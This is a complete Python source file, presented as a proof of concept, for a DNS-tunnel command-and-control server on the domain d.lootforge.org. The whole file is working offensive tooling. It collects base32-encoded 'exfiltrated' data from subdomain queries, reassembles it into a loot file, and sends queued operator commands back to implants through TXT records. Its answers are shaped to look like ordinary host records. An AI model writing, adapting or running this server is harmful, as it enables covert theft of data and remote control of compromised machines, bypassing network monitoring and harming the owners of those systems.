#!/usr/bin/env python3
"""
DNS Tunnel Server - PoC
Authoritative nameserver for d.lootforge.org.
Receives exfiltrated data from DNS subdomain queries.
Delivers operator commands as TXT record responses.

Setup:
  - Run with root / Administrator privileges (requires UDP/53).
  - Open UDP port 53 inbound on the host firewall.
  - lootforge.org NS delegation must point d.lootforge.org to cwmkeg.lootforge.org (this server's IP).
  - Windows: install Npcap (https://npcap.com) before running.

Received data is appended to OUTPUT_FILE with a timestamp.
Type a command at the console prompt to queue it for the client.
Type 'clear' to cancel any pending command.

Data query format (routed recursively through the DNS hierarchy):
  <b32chunk>.<seq>.<total>.<sessionid>.d.lootforge.org  (A query)

Command query format:
  command.d.lootforge.org  (TXT query)
  Server response TXT: base32-encoded command, or literal "NONE"
"""

import base64
import datetime
import socket
import sys
import threading

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, conf
from scapy.layers.dns import DNSRRSOA
from scapy.packet import NoPayload

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
VERSION     = "v2.0"
DOMAIN      = "d.lootforge.org"
NS_HOST     = "cwmkeg.lootforge.org"   # must match the NS glue record in lootforge.org
OUTPUT_FILE = "exfiltrated.txt"

conf.verb = 0  # suppress Scapy noise


# ---------------------------------------------------------------------------
# Shared mutable state (protected by locks)
# ---------------------------------------------------------------------------
_state_lock   = threading.Lock()
_state        = {"command": "NONE"}

_session_lock = threading.Lock()
_sessions     = {}                        # sid -> {"chunks": {idx: str}, "total": int}


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def _b32dec(s: str) -> bytes:
    s = s.upper()
    padding = (8 - len(s) % 8) % 8
    return base64.b32decode(s + "=" * padding)


def _b32enc(s: str) -> bytes:
    return base64.b32encode(s.encode("utf-8"))


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def _notify(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(msg)
    print("=" * 60)
    print(">>> ", end="", flush=True)


def _save(session_id: str, raw: bytes) -> None:
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        text = raw.decode("utf-8")
    except Exception:
        text = f"[binary] {raw.hex()}"

    with open(OUTPUT_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"[{ts}] [{session_id}] {text}\n")

    _notify(
        f"  DATA RECEIVED\n"
        f"  Session : {session_id}\n"
        f"  Time    : {ts}\n"
        f"  Payload : {text}"
    )


# ---------------------------------------------------------------------------
# DNS response builders
# ---------------------------------------------------------------------------

def _soa_rr(rrname: bytes) -> DNSRRSOA:
    """SOA record for the zone. TTL=0 prevents recursive resolvers from caching."""
    serial = int(datetime.datetime.now().strftime("%Y%m%d%H"))
    return DNSRRSOA(
        rrname=rrname,
        ttl=0,
        mname=(NS_HOST + ".").encode(),
        rname=("hostmaster." + DOMAIN + ".").encode(),
        serial=serial,
        refresh=3600,
        retry=900,
        expire=604800,
        minimum=0,
    )


def _opt_rr() -> DNSRR:
    """Minimal EDNS0 OPT record — advertises 4096-byte UDP payload support.
    Recursive resolvers include OPT in forwarded queries; echoing one back
    keeps the exchange RFC-compliant."""
    return DNSRR(rrname=b".", type=41, rclass=4096, ttl=0, rdata=b"")


def _wrap(req, dns_layer):
    """Wrap a DNS response layer in the correct IP/UDP return envelope."""
    return (
        IP(dst=req[IP].src, src=req[IP].dst)
        / UDP(dport=req[UDP].sport, sport=53)
        / dns_layer
    )


def _make_soa_response(req):
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(
        id=req[DNS].id, qr=1, aa=1, rd=0,
        qd=req[DNS].qd,
        an=_soa_rr(zone),
        ar=_opt_rr(),
    ))


def _make_ns_response(req):
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(
        id=req[DNS].id, qr=1, aa=1, rd=0,
        qd=req[DNS].qd,
        an=DNSRR(rrname=zone, type="NS", ttl=0, rdata=(NS_HOST + ".").encode()),
        ar=_opt_rr(),
    ))


def _make_a_response(req):
    """A record for data tunnel queries. Returns our own public IP (req[IP].dst)
    so the answer looks like a real host record rather than a loopback stub."""
    cover_ip = req[IP].dst
    return _wrap(req, DNS(
        id=req[DNS].id, qr=1, aa=1, rd=0,
        qd=req[DNS].qd,
        an=DNSRR(rrname=req[DNS].qd.qname, type="A", ttl=0, rdata=cover_ip),
        ar=_opt_rr(),
    ))


def _make_txt_response(req, txt: bytes):
    return _wrap(req, DNS(
        id=req[DNS].id, qr=1, aa=1, rd=0,
        qd=req[DNS].qd,
        an=DNSRR(rrname=req[DNS].qd.qname, type="TXT", ttl=0, rdata=txt),
        ar=_opt_rr(),
    ))


def _make_nxdomain_response(req):
    """RFC 2308: NXDOMAIN must include a SOA in the authority section so
    resolvers know the negative TTL and don't retry indefinitely."""
    zone = (DOMAIN + ".").encode()
    return _wrap(req, DNS(
        id=req[DNS].id, qr=1, aa=1, rd=0, rcode=3,
        qd=req[DNS].qd,
        ns=_soa_rr(zone),
        ar=_opt_rr(),
    ))


# ---------------------------------------------------------------------------
# Data reassembly
# ---------------------------------------------------------------------------

def _handle_data_query(sub_labels: list, src_ip: str) -> bool:
    """
    Parse a data-exfiltration sub-label list and accumulate chunks.
    Expected format: ['<b32chunk>', '<seq>', '<total>', '<sessionid>']
    Returns True if the format matched (even on decode error).
    """
    if len(sub_labels) < 4:
        return False

    session_id = sub_labels[-1]
    try:
        total   = int(sub_labels[-2])
        idx     = int(sub_labels[-3])
        raw_b32 = sub_labels[-4]
    except (ValueError, IndexError):
        return False

    with _session_lock:
        if session_id not in _sessions:
            _sessions[session_id] = {"chunks": {}, "total": total}
            print(f"\n[+] New session {session_id} from {src_ip} ({total} chunk(s) expected)")

        # Store raw base32 strings — join the full stream and decode once at
        # the end to avoid boundary misalignment across 50-char chunk splits.
        _sessions[session_id]["chunks"][idx] = raw_b32
        received = len(_sessions[session_id]["chunks"])

        if received == total:
            full_b32 = "".join(_sessions[session_id]["chunks"][i] for i in range(total))
            del _sessions[session_id]
            try:
                assembled = _b32dec(full_b32)
            except Exception as exc:
                print(f"\n[!] Decode error (session={session_id}): {exc}")
                return True
            threading.Thread(
                target=_save, args=(session_id, assembled), daemon=True
            ).start()
        else:
            print(f"[~] Session {session_id}: {received}/{total} chunks")

    return True


# ---------------------------------------------------------------------------
# Main packet handler
# ---------------------------------------------------------------------------

_DOMAIN_LABELS = DOMAIN.split(".")
_DOMAIN_LEN    = len(_DOMAIN_LABELS)


def _dns_handler(pkt) -> None:
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    dns = pkt[DNS]
    if dns.qr != 0 or dns.qdcount == 0:
        return

    qname = dns.qd.qname.decode("utf-8", errors="ignore").rstrip(".").lower()
    qtype = dns.qd.qtype

    # Use "." + DOMAIN to avoid prefix-matching an unrelated domain
    # (DNS names are case-insensitive, so compare lowercase)
    if qname != DOMAIN and not qname.endswith("." + DOMAIN):
        return

    labels     = qname.split(".")
    sub_labels = labels[:-_DOMAIN_LEN]
    src_ip     = pkt[IP].src

    print(f"\n[DNS] {src_ip} → {qname}  (type={qtype})")

    # --- Zone apex (SOA / NS) ---
    if not sub_labels:
        if qtype == 2:    # NS
            send(_make_ns_response(pkt), verbose=0)
        else:             # SOA and anything else at the apex
            send(_make_soa_response(pkt), verbose=0)
        return

    # --- Command query ---
    if sub_labels == ["command"]:
        with _state_lock:
            cmd = _state["command"]
        txt_payload = b"NONE" if cmd == "NONE" else _b32enc(cmd)
        print(f"[CMD] Responding with: {txt_payload.decode()}")
        send(_make_txt_response(pkt, txt_payload), verbose=0)
        return

    # --- Data exfiltration query ---
    if _handle_data_query(sub_labels, src_ip):
        send(_make_a_response(pkt), verbose=0)
        return

    # --- Anything else in the zone → NXDOMAIN ---
    print(f"[?]  Unknown subdomain → NXDOMAIN")
    send(_make_nxdomain_response(pkt), verbose=0)


# ---------------------------------------------------------------------------
# Operator console
# ---------------------------------------------------------------------------

def _console_loop() -> None:
    print("\n[*] Operator console ready.")
    print("    Type a command to queue it for the next client poll.")
    print("    Type 'clear' to remove any pending command.\n")

    while True:
        try:
            print(">>> ", end="", flush=True)
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            return

        if not line:
            continue

        if line.lower() == "clear":
            with _state_lock:
                _state["command"] = "NONE"
            print("[*] Command cleared — clients will receive NONE.")
        else:
            with _state_lock:
                _state["command"] = line
            encoded = _b32enc(line).decode()
            print(f"[*] Command queued : '{line}'")
            print(f"    Encoded (b32)   : {encoded}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("=" * 60)
    print(f"  DNS Tunnel Server - PoC ({VERSION})")
    print(f"  Zone        : {DOMAIN}")
    print(f"  NS hostname : {NS_HOST}")
    print(f"  Output file : {OUTPUT_FILE}")
    print(f"  Listening   : UDP/53 (all interfaces)")
    print("=" * 60)

    threading.Thread(target=_console_loop, daemon=True).start()

    # Bind a dummy UDP socket to port 53 so the kernel sees a listener and
    # does not fire ICMP port-unreachable for packets Scapy processes.
    _sink = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    _sink.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        _sink.bind(("0.0.0.0", 53))
        print("[*] ICMP suppression active (sink socket bound to UDP/53)")
    except OSError as e:
        print(f"[!] Could not bind sink socket (ICMP suppression disabled): {e}")

    print("[*] Sniffing for DNS queries…  (Ctrl+C to stop)\n")
    try:
        sniff(filter="udp port 53", prn=_dns_handler, store=0)
    except PermissionError:
        print("[!] Permission denied — run as root/Administrator.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
